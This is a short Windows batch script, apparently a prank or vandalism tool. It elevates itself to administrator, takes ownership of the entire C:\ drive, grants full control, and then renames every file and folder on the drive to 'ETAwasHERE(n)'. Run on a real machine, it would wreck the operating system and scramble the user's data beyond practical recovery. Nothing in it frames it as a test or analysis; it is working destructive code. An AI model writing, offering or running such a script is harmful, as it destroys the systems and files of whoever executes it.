@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo getting admin
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "target=C:\"

echo getting perms in "%target%"
takeown /f "%target%" /r /d y >nul
icacls "%target%" /grant administrators:F /t /c >nul

echo.
echo renaming ze files
set count=0

for /r "%target%" %%F in (*) do (
    set /a count+=1
    set "name=ETAwasHERE(!count!)"
    set "ext=%%~xF"
    ren "%%F" "!name!!ext!" 2>nul
)

echo.
echo Renaming folders...
for /r "%target%" %%D in (.) do (
    if not "%%~nxD"=="." (
        set /a count+=1
        ren "%%D" "ETAwasHERE(!count!)" 2>nul
    )
)

echo.
echo renamed !count! files & folders
pause
